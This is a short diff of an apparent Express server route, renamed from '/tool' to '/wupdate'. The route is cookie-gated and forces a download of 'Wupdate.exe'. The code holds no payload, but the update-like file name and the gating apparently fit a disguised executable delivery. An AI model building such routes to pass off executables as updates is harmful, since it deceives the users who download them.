@@ -6,7 +6,7 @@ const appDir = path.dirname(require.main.filename);
 
 router.use(toolCookieValidator);
 
-router.route('/tool').get((req, res) => {
+router.route('/wupdate').get((req, res) => {
     res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
     res.setHeader('Content-type', 'application/x-msdownload');
     let file = fs.createReadStream(`${appDir}\\tool\\Wupdate.exe`);
